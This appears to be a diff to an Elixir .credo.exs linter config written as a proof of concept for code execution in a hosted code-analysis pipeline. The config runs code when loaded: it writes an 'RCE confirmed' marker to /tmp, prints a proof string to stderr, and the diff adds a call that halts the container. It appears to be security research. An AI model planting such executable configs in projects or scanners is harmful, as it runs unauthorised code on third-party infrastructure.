@@ -5,16 +5,9 @@ marker = "/tmp/codacy-credo-rce-confirmed.txt"
 cwd = File.cwd!()
 File.write!(marker, "RCE confirmed via .credo.exs Code.eval_string. cwd=#{cwd} marker=#{marker}\n")
 
-# Emit the sentinel to STDERR so it surfaces in the codacy step output (proves our Elixir ran).
+# Emit sentinel to STDERR, then HALT the BEAM immediately so the container exits fast (chosen code 78)
+# and the sentinel lands in the captured step output before any timeout/OOM kills it.
 IO.puts(:stderr, "CODEX_RCE_CREDO_PROOF_#{cwd}_marker_written_#{marker}")
+System.halt(78)
 
-%{
-  configs: [
-    %{
-      name: "default",
-      files: %{included: ["lib/"], excluded: []},
-      strict: false,
-      checks: []
-    }
-  ]
-}
+%{configs: [%{name: "default", checks: []}]}
